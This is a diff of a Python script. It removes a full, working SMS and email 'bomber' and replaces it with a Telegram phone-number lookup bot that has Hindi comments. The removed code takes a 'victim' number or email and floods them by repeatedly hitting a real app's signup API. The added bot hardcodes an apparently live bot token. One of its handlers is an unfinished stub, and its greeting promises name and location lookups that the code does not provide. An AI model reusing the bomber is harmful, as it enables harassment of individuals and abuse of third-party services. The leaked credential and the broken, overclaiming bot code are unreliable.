@@ -1,74 +1,81 @@
-import os
-import asyncio
-import aiohttp
-import time
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import requests
+import logging
 
-API_URL = "https://prod.fitflexapp.com/api/users/signupV1"
+# तुम्हारा BOT TOKEN यहाँ डालो
+BOT_TOKEN = "8313201920:AAH1PfXk6b6sgBPNCT_H5AEMAhZETItO5gg"  # ← यहाँ पेस्ट करो
 
-def clear():
-    os.system('clear' if os.name == 'posix' else 'cls')
+# Numverify API (फ्री) — साइनअप: https://numverify.com
+NUMVERIFY_API = "http://apilayer.net/api/validate"
+ACCESS_KEY = "YOUR_NUMVERIFY_KEY"  # फ्री में मिलेगा
 
-async def send_bomb(session, method, target):
-    payload = {
-        "type": "msisdn" if method == "phone" else "email",
-        "user_platform": "Android",
-        "country_id": "162",
-        "msisdn": target if method == "phone" else "",
-        "email": target if method == "email" else ""
-    }
+logging.basicConfig(level=logging.INFO)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[KeyboardButton("📱 Send Phone Number", request_contact=True)]]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+    await update.message.reply_text(
+        "🔍 *Phone Lookup Bot*\n\n"
+        "मोबाइल नंबर भेजो, मैं नाम/लोकेशन बताऊंगा!\n"
+        "(सिर्फ तुम्हारा डेटा, कोई लीक नहीं)",
+        parse_mode='Markdown',
+        reply_markup=reply_markup
+    )
+
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    contact = update.message.contact
+    phone = contact.phone_number
+    if not phone.startswith('+'):
+        phone = '+' + phone
+
+    await update.message.reply_text(f"🔎 चेक कर रहा हूँ: {phone}...")
+
+    # Numverify से डेटा
     try:
-        async with session.post(API_URL, json=payload, timeout=10) as resp:
-            return resp.status == 200
-    except:
-        return False
+        params = {'access_key': ACCESS_KEY, 'number': phone, 'country_code': '', 'format': 1}
+        r = requests.get(NUMVERIFY_API, params=params, timeout=10)
+        data = r.json()
 
-async def bomber(method):
-    target = input("\n🎯 ENTER YOUR VICTIM " + ("NUMBER (e.g. +923001234567): " if method == "phone" else "EMAIL: "))
-    count = int(input("🔁 ENTER AMOUNT OF BOMBING: "))
-    delay = float(input("⏱️ ENTER SCE OF DELAYS (seconds): "))
-
-    success = 0
-    failed = 0
-
-    async with aiohttp.ClientSession() as session:
-        for i in range(count):
-            ok = await send_bomb(session, method, target)
-            if ok:
-                success += 1
+        if data['valid']:
+            info = f"""
+📞 *नंबर*: {data['international_format']}
+🌍 *देश*: {data['country_name']} ({data['location']})
+📶 *कैरियर*: {data['carrier']}
+✅ *वैलिड*: हाँ
+            """
+            if data.get('line_type') == 'mobile':
+                info += "\n📱 *टाइप*: मोबाइल"
             else:
-                failed += 1
+                info += "\n☎️ *टाइप*: लैंडलाइन"
+        else:
+            info = "❌ नंबर वैलिड नहीं या प्राइवेट है।"
+    except:
+        info = "⚠️ API एरर। बाद में ट्राय करो।"
 
-            percent = int((i + 1) / count * 100)
-            bar = "█" * (percent // 10) + "░" * (10 - percent // 10)
-            print(f"\r📡 Progress: [{bar}] {percent}% | ✅ {success} ❌ {failed}", end="")
-            await asyncio.sleep(delay)
+    await update.message.reply_text(info, parse_mode='Markdown')
 
-    print(f"\n\n✅ Done!\nTotal Sent: {count}\n🟢 Success: {success}, 🔴 Failed: {failed}")
-
-async def main():
-    print("🔗 JOIN OWNER WHATSAPP CHANNEL: https://wa.me/XXXXXXXXXXX")
-    input("\n👉 Press Enter to continue...")
-    clear()
-
-    print("╔════════════════════════════╗")
-    print("║     OLD-X SMS + EMAIL     ║")
-    print("║         BOMBER TOOL       ║")
-    print("╚════════════════════════════╝\n")
-
-    print("📱 ENTER 1 TO SMS BOMBING")
-    print("✉️  ENTER 2 TO EMAIL BOMBING")
-    
-    choice = input("\n🎯 ENTER YOUR CHOICE: ").strip()
-
-    if choice == "1":
-        await bomber("phone")
-    elif choice == "2":
-        await bomber("email")
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.startswith('+') and len(text) >= 10:
+        await handle_contact_sim(update, text)
     else:
-        print("❌ Invalid choice. Exiting...")
+        await update.message.reply_text("📱 कृपया वैलिड नंबर भेजो (+91 से शुरू) या कॉन्टैक्ट शेयर करो।")
 
-if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n🚫 Tool stopped by user.")
+async def handle_contact_sim(update: Update, phone):
+    # ऊपर वाला ही कोड (डुप्लिकेट से बचने को)
+    await update.message.reply_text(f"🔎 चेक कर रहा हूँ: {phone}...")
+    # वही API कोड यहाँ पेस्ट करो (ऊपर वाला)
+
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+
+    print("Bot चल रहा है...")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
